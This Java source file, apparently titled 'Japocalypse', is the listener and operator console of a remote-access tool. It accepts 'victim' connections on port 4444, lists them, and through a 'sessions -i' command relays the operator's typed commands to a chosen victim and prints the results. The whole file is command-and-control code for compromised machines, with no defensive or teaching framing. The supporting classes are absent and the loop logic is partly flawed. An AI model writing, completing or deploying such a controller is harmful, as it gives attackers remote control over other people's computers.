package Server;

import java.io.IOException;
import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Scanner;

/**
 * Created by mpampis on 7/2/2017.
 */
public class Japocalypse {
    private List<Victim> victimList = Collections.synchronizedList(new ArrayList<Victim>());
    private ArrayList<Command> commands = new ArrayList<>();
    private Scanner scanner = new Scanner(System.in);
    private String[] identifiers = {"-i"};
	
    public Japocalypse() {
        loadCommands();
        new Thread(new AcceptConnections(victimList)).start();
        while(true) {
            Command command = readCommand();
            int index = indexOf(commands,command);
            if(index > -1) {
                ArrayList<String> argList = new ArrayList<>();
                String[] strs = command.toString().split(" ");
                for(int i = 1; i < strs.length;i++) {
                    argList.add(strs[i]);
                }
                commands.get(index).execute(argList.toArray(new String[argList.size()]));
            }
        }
    }

    private static int indexOf(List<?> list, Object object) {
        for(int i = 0; i < list.size();i++) {
            if(list.get(i).equals(object)) {
                return i;
            }
        }

        return -1;
    }

    private void handleVictim(Victim victim) {
        while(true) {
            try {
                System.out.print(victim.waitForAndRead());
                String command = scanner.nextLine();
                if(command.equals("back"))break;
                victim.out.println(command);
                victim.out.flush();
            } catch (Exception e) {
                System.out.println("Connection refused: " + victim.getSocket().getInetAddress().getHostAddress());
            }
        }
    }

    private void loadCommands() {
        Command c = new Command("sessions");
        c.addLogic(args -> {
            if(args.length == 0) {
                printConnectedMachines();
            }
            else {
                if(args[0].equals("-i")) {
                   try {
                        int id = Integer.parseInt(args[1]);
                        int index = indexOf(victimList,id);

                        if(index < 0) {
                            System.out.println("Could not find this session's id");
                            return false;
                        }

                        handleVictim(victimList.get(index));

                   }
                   catch(NumberFormatException e) {
                       System.out.println("Invalid argument: "+args[1]);
                   }
                   catch(IndexOutOfBoundsException e) {
                       System.out.println("Missing argument");
                   }
                }
                else {
                    System.out.println("Cannot find command");
                    return false;
                }
            }
            return true;
        });
        commands.add(c);

    }

    private boolean isIdentifier(String id) {
        for(String ide : identifiers) {
            if(ide.equals(id))
                return true;
        }

        return false;
    }

    private boolean validateCommand(String command) {
        return true;
    }


    private Command readCommand() {
        System.out.print("Japocalypse> ");
        return new Command(scanner.nextLine());
    }

    private void printConnectedMachines() {
        for(Victim v : victimList) {
            System.out.println(v);
        }
    }
}

class AcceptConnections implements Runnable {
    private List<Victim> list;

    public AcceptConnections(List<Victim> list) {
        this.list = list;
    }

    @Override
    public void run() {
        while(true) {
            try {
                ServerSocket serverSocket = new ServerSocket(4444);
                Victim victim = new Victim(serverSocket.accept());
                list.add(victim);
                System.out.println(victim.getID() + " connected: "+victim.getSocket().getInetAddress().getHostAddress());

            } catch (IOException ex) {

            }
        }
    }
}
